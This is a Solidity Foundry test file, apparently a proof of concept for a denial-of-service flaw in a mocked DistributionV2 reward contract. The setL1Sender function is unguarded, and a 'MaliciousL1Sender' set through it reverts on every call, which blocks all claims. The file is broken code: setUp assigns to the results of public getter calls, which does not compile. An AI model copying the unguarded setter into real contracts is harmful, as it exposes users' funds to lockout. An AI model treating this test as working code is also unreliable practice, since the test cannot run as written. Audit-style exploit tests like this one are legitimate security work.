// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Mock interface for L1Sender
interface IL1Sender {
    function sendMintMessage(address receiver, uint256 amount, address user) external payable;
}

// Mock L1Sender contract that always reverts
contract MaliciousL1Sender is IL1Sender {
    function sendMintMessage(address, uint256, address) external payable override {
        revert("MaliciousL1Sender: always revert");
    }
}

// Mock DistributionV2 contract
contract DistributionV2 {
    struct Pool {
        uint256 payoutStart;
        uint256 claimLockPeriod;
    }

    struct PoolData {
        uint128 lastUpdate;
        uint256 rate;
        uint256 totalVirtualDeposited;
    }

    struct UserData {
        uint256 deposited;
        uint256 virtualDeposited;
        uint256 pendingRewards;
        uint256 rate;
        uint128 claimLockStart;
        uint128 claimLockEnd;
    }

    mapping(uint256 => Pool) public pools;
    mapping(uint256 => PoolData) public poolsData;
    mapping(address => mapping(uint256 => UserData)) public usersData;
    address public l1Sender;

    event UserClaimed(uint256 poolId, address user, address receiver, uint256 pendingRewards);

    modifier poolExists(uint256 poolId) {
        require(pools[poolId].payoutStart > 0, "Pool does not exist");
        _;
    }

    function setL1Sender(address _l1Sender) external {
        l1Sender = _l1Sender;
    }

    function claim(uint256 poolId, address receiver) external payable poolExists(poolId) {
        address user = msg.sender;

        Pool storage pool = pools[poolId];
        PoolData storage poolData = poolsData[poolId];
        UserData storage userData = usersData[user][poolId];

        require(block.timestamp > pool.payoutStart + pool.claimLockPeriod, "DS: pool claim is locked");
        require(block.timestamp > userData.claimLockEnd, "DS: user claim is locked");

        uint256 currentPoolRate = 1; // Simplified for mock
        uint256 pendingRewards = 100; // Simplified for mock
        require(pendingRewards > 0, "DS: nothing to claim");

        if (userData.virtualDeposited == 0) {
            userData.virtualDeposited = userData.deposited;
        }

        poolData.lastUpdate = uint128(block.timestamp);
        poolData.rate = currentPoolRate;
        poolData.totalVirtualDeposited = poolData.totalVirtualDeposited + userData.deposited - userData.virtualDeposited;

        userData.rate = currentPoolRate;
        userData.pendingRewards = 0;
        userData.virtualDeposited = userData.deposited;
        userData.claimLockStart = 0;
        userData.claimLockEnd = 0;

        IL1Sender(l1Sender).sendMintMessage{value: msg.value}(receiver, pendingRewards, user);

        emit UserClaimed(poolId, user, receiver, pendingRewards);
    }
}

contract ExploitTest is Test {
    DistributionV2 distribution;
    MaliciousL1Sender maliciousL1Sender;
    address user = address(0x123);

    function setUp() public {
        distribution = new DistributionV2();
        maliciousL1Sender = new MaliciousL1Sender();

        // Set the malicious L1Sender contract
        distribution.setL1Sender(address(maliciousL1Sender));

        // Set up a pool and user data
        distribution.pools(1).payoutStart = block.timestamp - 1 days;
        distribution.pools(1).claimLockPeriod = 1 days;
        distribution.usersData(user, 1).deposited = 1000;
        distribution.usersData(user, 1).claimLockEnd = block.timestamp - 1 days;

        // Fund the user with some ETH
        vm.deal(user, 1 ether);
    }

    function test_exploit() public {
        // Impersonate the user
        vm.prank(user);

        // Attempt to claim rewards, expecting a revert due to the malicious L1Sender
        vm.expectRevert("MaliciousL1Sender: always revert");
        distribution.claim{value: 0.1 ether}(1, user);
    }
}